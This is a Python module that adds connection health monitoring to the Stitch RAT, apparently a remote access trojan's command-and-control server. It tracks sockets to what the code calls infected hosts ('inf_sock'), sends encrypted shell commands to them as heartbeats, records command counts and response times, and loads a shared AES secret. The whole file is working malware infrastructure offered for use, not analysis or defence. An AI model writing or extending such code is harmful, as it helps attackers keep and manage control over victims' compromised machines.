#!/usr/bin/env python3
"""
Connection Health Monitoring System for Stitch RAT
Provides heartbeat, health checks, and connection state management
"""
import time
import socket
import threading
from datetime import datetime, timedelta
from typing import Dict, Optional, Tuple, List
from dataclasses import dataclass
from collections import defaultdict
import logging

logger = logging.getLogger(__name__)

@dataclass
class ConnectionHealth:
    """Connection health metrics"""
    ip_address: str
    connected_at: datetime
    last_seen: datetime
    last_heartbeat: Optional[datetime]
    heartbeat_failures: int
    total_commands: int
    avg_response_time: float
    is_alive: bool
    connection_quality: str  # 'excellent', 'good', 'poor', 'critical'

class ConnectionHealthMonitor:
    """Monitor and manage connection health"""
    
    def __init__(self, heartbeat_interval=30, max_failures=3, stale_threshold=300):
        """
        Initialize connection health monitor
        
        Args:
            heartbeat_interval: Seconds between heartbeat checks
            max_failures: Max consecutive heartbeat failures before marking dead
            stale_threshold: Seconds before connection considered stale
        """
        self.heartbeat_interval = heartbeat_interval
        self.max_failures = max_failures
        self.stale_threshold = stale_threshold
        
        # Connection tracking
        self.connections: Dict[str, ConnectionHealth] = {}
        self.response_times: Dict[str, List[float]] = defaultdict(list)
        
        # Monitoring control
        self.monitoring_active = False
        self.monitor_thread = None
        self.lock = threading.RLock()
        
        logger.info(f"Connection health monitor initialized (heartbeat: {heartbeat_interval}s)")
    
    def register_connection(self, ip_address: str) -> None:
        """
        Register a new connection for monitoring
        
        Args:
            ip_address: IP address of the connection
        """
        with self.lock:
            now = datetime.now()
            self.connections[ip_address] = ConnectionHealth(
                ip_address=ip_address,
                connected_at=now,
                last_seen=now,
                last_heartbeat=None,
                heartbeat_failures=0,
                total_commands=0,
                avg_response_time=0.0,
                is_alive=True,
                connection_quality='good'
            )
            
            logger.info(f"Registered connection for monitoring: {ip_address}")
    
    def unregister_connection(self, ip_address: str) -> None:
        """
        Unregister a connection from monitoring
        
        Args:
            ip_address: IP address of the connection
        """
        with self.lock:
            if ip_address in self.connections:
                del self.connections[ip_address]
                if ip_address in self.response_times:
                    del self.response_times[ip_address]
                logger.info(f"Unregistered connection from monitoring: {ip_address}")
    
    def update_last_seen(self, ip_address: str) -> None:
        """
        Update last seen timestamp for a connection
        
        Args:
            ip_address: IP address of the connection
        """
        with self.lock:
            if ip_address in self.connections:
                self.connections[ip_address].last_seen = datetime.now()
                # Reset heartbeat failures on activity
                self.connections[ip_address].heartbeat_failures = 0
    
    def record_command_execution(self, ip_address: str, response_time: float) -> None:
        """
        Record command execution metrics
        
        Args:
            ip_address: IP address of the connection
            response_time: Command response time in seconds
        """
        with self.lock:
            if ip_address in self.connections:
                conn = self.connections[ip_address]
                conn.total_commands += 1
                conn.last_seen = datetime.now()
                
                # Track response times (keep last 10)
                self.response_times[ip_address].append(response_time)
                if len(self.response_times[ip_address]) > 10:
                    self.response_times[ip_address].pop(0)
                
                # Update average response time
                conn.avg_response_time = sum(self.response_times[ip_address]) / len(self.response_times[ip_address])
                
                # Update connection quality based on response time
                if conn.avg_response_time < 1.0:
                    conn.connection_quality = 'excellent'
                elif conn.avg_response_time < 3.0:
                    conn.connection_quality = 'good'
                elif conn.avg_response_time < 10.0:
                    conn.connection_quality = 'poor'
                else:
                    conn.connection_quality = 'critical'
    
    def perform_heartbeat_check(self, ip_address: str, socket_conn, aes_key) -> bool:
        """
        Perform heartbeat check on a connection
        
        Args:
            ip_address: IP address of the connection
            socket_conn: Socket connection object
            aes_key: AES encryption key
            
        Returns:
            bool: True if heartbeat successful
        """
        try:
            # Import here to avoid circular imports
            from Application.stitch_lib import st_send, st_receive
            
            start_time = time.time()
            
            # Set short timeout for heartbeat
            original_timeout = socket_conn.gettimeout()
            socket_conn.settimeout(5.0)
            
            try:
                # Send heartbeat ping
                st_send(socket_conn, b'echo heartbeat_ping', aes_key)
                response = st_receive(socket_conn, aes_key, as_string=True)
                
                response_time = time.time() - start_time
                
                # Check if response contains expected heartbeat
                if 'heartbeat_ping' in response:
                    with self.lock:
                        if ip_address in self.connections:
                            conn = self.connections[ip_address]
                            conn.last_heartbeat = datetime.now()
                            conn.heartbeat_failures = 0
                            conn.is_alive = True
                            
                            # Record response time
                            self.record_command_execution(ip_address, response_time)
                    
                    return True
                else:
                    logger.warning(f"Heartbeat response invalid for {ip_address}: {response[:50]}")
                    return False
                    
            finally:
                # Restore original timeout
                try:
                    socket_conn.settimeout(original_timeout)
                except:
                    pass
                    
        except (socket.timeout, socket.error, ConnectionError) as e:
            logger.warning(f"Heartbeat failed for {ip_address}: {e}")
            
            with self.lock:
                if ip_address in self.connections:
                    conn = self.connections[ip_address]
                    conn.heartbeat_failures += 1
                    
                    # Mark as dead if too many failures
                    if conn.heartbeat_failures >= self.max_failures:
                        conn.is_alive = False
                        conn.connection_quality = 'critical'
                        logger.error(f"Connection {ip_address} marked as dead after {conn.heartbeat_failures} failures")
            
            return False
        except Exception as e:
            logger.error(f"Heartbeat check error for {ip_address}: {e}")
            return False
    
    def check_stale_connections(self) -> List[str]:
        """
        Check for stale connections that haven't been seen recently
        
        Returns:
            List of IP addresses that are stale
        """
        stale_connections = []
        cutoff_time = datetime.now() - timedelta(seconds=self.stale_threshold)
        
        with self.lock:
            for ip_address, conn in self.connections.items():
                if conn.last_seen < cutoff_time:
                    conn.is_alive = False
                    conn.connection_quality = 'critical'
                    stale_connections.append(ip_address)
        
        return stale_connections
    
    def get_connection_health(self, ip_address: str) -> Optional[ConnectionHealth]:
        """
        Get health information for a connection
        
        Args:
            ip_address: IP address of the connection
            
        Returns:
            ConnectionHealth object or None if not found
        """
        with self.lock:
            return self.connections.get(ip_address)
    
    def get_all_connections_health(self) -> Dict[str, ConnectionHealth]:
        """
        Get health information for all connections
        
        Returns:
            Dictionary of IP addresses to ConnectionHealth objects
        """
        with self.lock:
            return self.connections.copy()
    
    def get_health_summary(self) -> Dict[str, int]:
        """
        Get summary of connection health statistics
        
        Returns:
            Dictionary with health statistics
        """
        with self.lock:
            total = len(self.connections)
            alive = sum(1 for conn in self.connections.values() if conn.is_alive)
            dead = total - alive
            
            quality_counts = defaultdict(int)
            for conn in self.connections.values():
                quality_counts[conn.connection_quality] += 1
            
            return {
                'total_connections': total,
                'alive_connections': alive,
                'dead_connections': dead,
                'excellent_quality': quality_counts['excellent'],
                'good_quality': quality_counts['good'],
                'poor_quality': quality_counts['poor'],
                'critical_quality': quality_counts['critical']
            }
    
    def start_monitoring(self, stitch_server) -> None:
        """
        Start background monitoring thread
        
        Args:
            stitch_server: Stitch server instance to monitor
        """
        if self.monitoring_active:
            logger.warning("Monitoring already active")
            return
        
        self.monitoring_active = True
        self.monitor_thread = threading.Thread(
            target=self._monitoring_loop,
            args=(stitch_server,),
            daemon=True,
            name="ConnectionHealthMonitor"
        )
        self.monitor_thread.start()
        logger.info("Connection health monitoring started")
    
    def stop_monitoring(self) -> None:
        """Stop background monitoring"""
        self.monitoring_active = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=5)
        logger.info("Connection health monitoring stopped")
    
    def _monitoring_loop(self, stitch_server) -> None:
        """
        Main monitoring loop (runs in background thread)
        
        Args:
            stitch_server: Stitch server instance to monitor
        """
        logger.info("Connection health monitoring loop started")
        
        while self.monitoring_active:
            try:
                # Get current connections from server
                current_connections = set(stitch_server.inf_sock.keys())
                
                # Register new connections
                with self.lock:
                    tracked_connections = set(self.connections.keys())
                
                # Register new connections
                for ip in current_connections - tracked_connections:
                    self.register_connection(ip)
                
                # Remove disconnected connections
                for ip in tracked_connections - current_connections:
                    self.unregister_connection(ip)
                
                # Perform heartbeat checks on active connections
                for ip_address in current_connections:
                    if ip_address in stitch_server.inf_sock:
                        socket_conn = stitch_server.inf_sock[ip_address]
                        
                        # Get AES key for this connection
                        aes_key = self._get_connection_aes_key(ip_address)
                        if aes_key:
                            # Perform heartbeat in separate thread to avoid blocking
                            heartbeat_thread = threading.Thread(
                                target=self.perform_heartbeat_check,
                                args=(ip_address, socket_conn, aes_key),
                                daemon=True
                            )
                            heartbeat_thread.start()
                
                # Check for stale connections
                stale_connections = self.check_stale_connections()
                if stale_connections:
                    logger.warning(f"Found {len(stale_connections)} stale connections: {stale_connections}")
                
                # Log health summary periodically
                if int(time.time()) % 300 == 0:  # Every 5 minutes
                    summary = self.get_health_summary()
                    logger.info(f"Health summary: {summary}")
                
            except Exception as e:
                logger.error(f"Error in monitoring loop: {e}")
            
            # Sleep until next check
            time.sleep(self.heartbeat_interval)
        
        logger.info("Connection health monitoring loop ended")
    
    def _get_connection_aes_key(self, ip_address: str):
        """
        Get AES key for connection (simplified for now)
        
        Args:
            ip_address: IP address of connection
            
        Returns:
            AES key or None
        """
        try:
            # Import AES key from globals
            from Application.Stitch_Vars.st_aes import secret
            return secret
        except Exception as e:
            logger.error(f"Failed to get AES key for {ip_address}: {e}")
            return None

# Global health monitor instance
health_monitor = ConnectionHealthMonitor()

def get_health_monitor() -> ConnectionHealthMonitor:
    """Get the global health monitor instance"""
    return health_monitor

def start_health_monitoring(stitch_server) -> None:
    """Start connection health monitoring"""
    health_monitor.start_monitoring(stitch_server)

def stop_health_monitoring() -> None:
    """Stop connection health monitoring"""
    health_monitor.stop_monitoring()

def update_connection_activity(ip_address: str) -> None:
    """Update connection activity timestamp"""
    health_monitor.update_last_seen(ip_address)

def record_command_metrics(ip_address: str, response_time: float) -> None:
    """Record command execution metrics"""
    health_monitor.record_command_execution(ip_address, response_time)

def get_connection_status(ip_address: str) -> Optional[Dict]:
    """
    Get connection status information
    
    Args:
        ip_address: IP address of connection
        
    Returns:
        Dictionary with connection status or None
    """
    health = health_monitor.get_connection_health(ip_address)
    if not health:
        return None
    
    return {
        'ip_address': health.ip_address,
        'connected_at': health.connected_at.isoformat(),
        'last_seen': health.last_seen.isoformat(),
        'last_heartbeat': health.last_heartbeat.isoformat() if health.last_heartbeat else None,
        'heartbeat_failures': health.heartbeat_failures,
        'total_commands': health.total_commands,
        'avg_response_time': health.avg_response_time,
        'is_alive': health.is_alive,
        'connection_quality': health.connection_quality,
        'uptime_seconds': int((datetime.now() - health.connected_at).total_seconds()),
        'last_seen_seconds_ago': int((datetime.now() - health.last_seen).total_seconds())
    }

def get_all_connections_status() -> Dict[str, Dict]:
    """
    Get status for all connections
    
    Returns:
        Dictionary mapping IP addresses to status information
    """
    all_health = health_monitor.get_all_connections_health()
    return {ip: get_connection_status(ip) for ip in all_health.keys()}

def get_health_summary() -> Dict:
    """Get overall health summary"""
    return health_monitor.get_health_summary()

# Export main classes and functions
__all__ = [
    'ConnectionHealth',
    'ConnectionHealthMonitor',
    'get_health_monitor',
    'start_health_monitoring',
    'stop_health_monitoring',
    'update_connection_activity',
    'record_command_metrics',
    'get_connection_status',
    'get_all_connections_status',
    'get_health_summary'
]